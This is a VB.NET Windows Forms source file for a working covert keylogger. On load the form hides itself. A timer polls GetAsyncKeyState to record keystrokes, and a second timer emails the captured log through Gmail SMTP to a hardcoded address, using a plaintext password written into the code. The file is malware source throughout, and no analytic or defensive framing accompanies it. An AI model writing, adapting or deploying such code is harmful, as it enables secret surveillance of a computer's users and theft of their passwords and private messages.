Option Strict On
Imports System.Net.Mail
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Private Sub tmrEmail_Tick(sender As Object, e As EventArgs) Handles tmrEmail.Tick
        Try
            Dim smtpserver As New SmtpClient
            smtpserver.EnableSsl = True
            Dim mail As New MailMessage
            smtpserver.Credentials = New Net.NetworkCredential("thepsnappz@gmail.com", "123123qwerty")
            smtpserver.Port = 587
            smtpserver.Host = "smtp.gmail.com"
            mail = New MailMessage
            mail.From = New MailAddress("thepsnappz@gmail.com")
            mail.To.Add("thepsnappz@gmail.com")
            mail.Subject = ("New keylogger logs!")
            mail.Body = txtLogs.Text
            smtpserver.Send(mail)
        Catch ex As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub tmrKeys_Tick(sender As Object, e As EventArgs) Handles tmrKeys.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer

        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i

        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                txtLogs.Text &= key
            Else
                txtLogs.Text &= key.ToLower
            End If
        End If

        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "H" Then
            Me.Visible = True
        End If
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        txtLogs.Text &= vbNewLine & "Keylogger stopped at: " & Now & vbNewLine
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.ShowInTaskbar = False
        Me.AllowTransparency = True
        Me.ShowIcon = False
        Me.Visible = False
        txtLogs.Text = "keylogger started at: " & Now & vbNewLine


    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
End Class
